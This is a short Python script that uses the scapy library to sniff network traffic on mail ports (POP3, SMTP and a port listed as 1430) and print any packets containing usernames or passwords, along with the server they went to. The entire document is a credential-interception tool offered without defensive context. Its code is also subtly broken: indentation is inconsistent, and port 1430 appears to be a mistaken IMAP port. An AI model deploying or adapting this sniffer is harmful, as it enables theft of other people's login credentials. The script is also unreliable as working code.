from scapy.all import *

def packet_callback(packet):
	if packet[TCP].payload:
        mall_packet = str(packet[TCP].payload)
        if "user" in mall_packet.lower() or "pass" in mall_packet.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload
sniff(filter="tcp port 110 or tcp port 25 or tcp port 1430",prn=packet_callback,store=0)